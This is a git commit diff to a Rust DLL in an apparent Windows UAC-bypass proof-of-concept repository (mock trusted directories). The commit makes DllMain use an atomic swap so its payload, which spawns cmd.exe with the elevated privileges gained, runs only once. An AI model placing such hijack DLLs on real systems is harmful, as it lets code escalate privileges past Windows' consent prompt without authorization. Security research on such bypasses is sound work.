aca07c33fdd11833996649646ca7c59218cc5673
Jay Jackson <jj@jj.is-a.dev>
2022-04-07 16:14:18 -0400

    Update lib.rs

--- uac-bypasses/mock-trusted-directories/dll/src/lib.rs
+++ uac-bypasses/mock-trusted-directories/dll/src/lib.rs
@@ -4,12 +4,10 @@ static HAS_RUN: AtomicBool = AtomicBool::new(false);
 
 #[no_mangle]
 pub extern "C" fn DllMain() {
-    if !HAS_RUN.load(Ordering::Relaxed) {
+    if !HAS_RUN.swap(true, Ordering::Relaxed) {
         // do whatever you want here with admin privileges.
         // in this case, I just spawn a command prompt.
         std::process::Command::new("cmd.exe").spawn().unwrap();
-
-        HAS_RUN.store(true, Ordering::Relaxed);
     }
 }
 
